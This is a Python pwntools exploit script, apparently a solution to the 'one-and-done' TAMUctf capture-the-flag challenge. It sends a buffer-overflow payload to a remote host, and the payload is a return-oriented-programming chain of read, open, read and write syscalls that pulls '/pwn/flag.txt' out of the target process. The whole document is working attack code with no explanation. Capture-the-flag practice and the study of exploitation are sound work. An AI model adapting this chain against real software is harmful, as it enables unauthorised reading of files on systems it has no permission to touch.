from pwn import *

elf = ELF("./one-and-done")
rop = ROP(elf)
context.update(arch='amd64', os='linux')
sock = remote("tamuctf.com", 443, ssl=True, sni="one-and-done")
#sock = process(elf.path)
#sock = gdb.debug(elf.path, gdbscript="""
#        break main
#        continue
#""")

memoarea = 0x405e00
ret = 0x000000000040100c
syscall_ret = 0x401d89
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]


payload = b"A" * 0x128
# read(rdi: 0x0, rsi: memoarea, rdx: 0x20)
payload += p64(pop_rax)
payload += p64(constants.SYS_read)
payload += p64(pop_rdi)
payload += p64(0x0)
payload += p64(pop_rsi)
payload += p64(memoarea)
payload += p64(pop_rdx)
payload += p64(0x20)
payload += p64(syscall_ret)
# open(rdi: memoarea("/pwn/flag.txt\\0"), rsi: 0x0, rdx: 0x0)
payload += p64(pop_rax)
payload += p64(constants.SYS_open)
payload += p64(pop_rdi)
payload += p64(memoarea)
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(pop_rdx)
payload += p64(0x0)
payload += p64(syscall_ret)
# read(rdi: 3, rsi: memoarea+0x20, rdx: 0x40)
payload += p64(pop_rax)
payload += p64(constants.SYS_read)
payload += p64(pop_rdi)
payload += p64(0x3)
payload += p64(pop_rsi)
payload += p64(memoarea+0x20)
payload += p64(pop_rdx)
payload += p64(0x40)
payload += p64(syscall_ret)
# write(rdi: 1, rsi: memoarea+0x20, rdx: 0x40)
payload += p64(pop_rax)
payload += p64(constants.SYS_write)
payload += p64(pop_rdi)
payload += p64(0x1)
payload += p64(pop_rsi)
payload += p64(memoarea+0x20)
payload += p64(pop_rdx)
payload += p64(0x40)
payload += p64(syscall_ret)

sock.sendlineafter(b"pwn me pls\n", payload)

#time.sleep(1)
sock.sendline(b"/pwn/flag.txt\x00")
#sock.sendline(b"./flag.txt\x00" )

sock.interactive()
